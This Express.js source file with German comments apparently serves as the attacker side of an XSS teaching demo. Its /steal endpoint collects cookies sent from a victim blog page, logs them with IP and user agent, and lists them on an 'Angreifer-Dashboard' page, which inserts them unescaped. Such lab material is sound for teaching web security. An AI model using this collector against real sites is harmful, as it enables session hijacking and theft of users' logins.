import express from "express";

const app = express();
const PORT = 4000;

// Speicher für gestohlene Daten
const stolenData = [];

// CORS-Header setzen (der Angreifer kontrolliert seinen Server und erlaubt alles)
app.use((_req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    next();
});

// Endpunkt zum Empfangen gestohlener Cookies
app.get("/steal", (req, res) => {
    const cookie = req.query.cookie;
    const timestamp = new Date().toISOString();

    console.log(`\n[${timestamp}] Cookie gestohlen!`);
    console.log(`Cookie: ${cookie}`);

    stolenData.push({
        timestamp,
        cookie,
        userAgent: req.headers["user-agent"],
        ip: req.ip,
    });

    res.json({ success: true });
});

// Startseite zeigt gestohlene Daten an
app.get("/", (_req, res) => {
    const html = `
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Angreifer-Dashboard</title>
    <style>
        body {
            font-family: monospace;
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
            background: #1a1a1a;
            color: #0f0;
        }
        h1 {
            color: #f00;
            text-align: center;
        }
        .info {
            background: #2a2a2a;
            padding: 1rem;
            border-radius: 4px;
            margin-bottom: 2rem;
            border: 1px solid #444;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #2a2a2a;
        }
        th, td {
            padding: 0.75rem;
            text-align: left;
            border: 1px solid #444;
        }
        th {
            background: #333;
            color: #f90;
        }
        .empty {
            text-align: center;
            padding: 2rem;
            color: #888;
            font-style: italic;
        }
        .cookie {
            word-break: break-all;
            font-weight: bold;
            color: #ff0;
        }
        button {
            background: #f00;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 1rem;
        }
        button:hover {
            background: #c00;
        }
    </style>
</head>
<body>
    <h1>⚠️ Angreifer-Dashboard ⚠️</h1>

    <div class="info">
        <p><strong>Dieser Server simuliert einen Angreifer-Server.</strong></p>
        <p>Alle Daten, die hier ankommen, wurden erfolgreich von der Blog-Seite gestohlen.</p>
        <p>Gestohlene Einträge: <strong>${stolenData.length}</strong></p>
        <button onclick="location.reload()">Aktualisieren</button>
    </div>

    ${
        stolenData.length === 0
            ? '<div class="empty">Noch keine gestohlenen Daten... Warte auf XSS-Angriff!</div>'
            : `
    <table>
        <thead>
            <tr>
                <th>Zeitpunkt</th>
                <th>Gestohlenes Cookie</th>
                <th>User Agent</th>
                <th>IP</th>
            </tr>
        </thead>
        <tbody>
            ${stolenData
                .map(
                    (entry) => `
                <tr>
                    <td>${new Date(entry.timestamp).toLocaleString("de-DE")}</td>
                    <td class="cookie">${entry.cookie || "(leer)"}</td>
                    <td>${entry.userAgent}</td>
                    <td>${entry.ip}</td>
                </tr>
            `,
                )
                .join("")}
        </tbody>
    </table>
    `
    }
</body>
</html>
    `;

    res.send(html);
});

app.listen(PORT, () => {
    console.log(`\n🔴 Angreifer-Server läuft auf http://localhost:${PORT}`);
    console.log("Warte auf gestohlene Daten...");
    console.log("Drücke Strg+C zum Beenden\n");
});
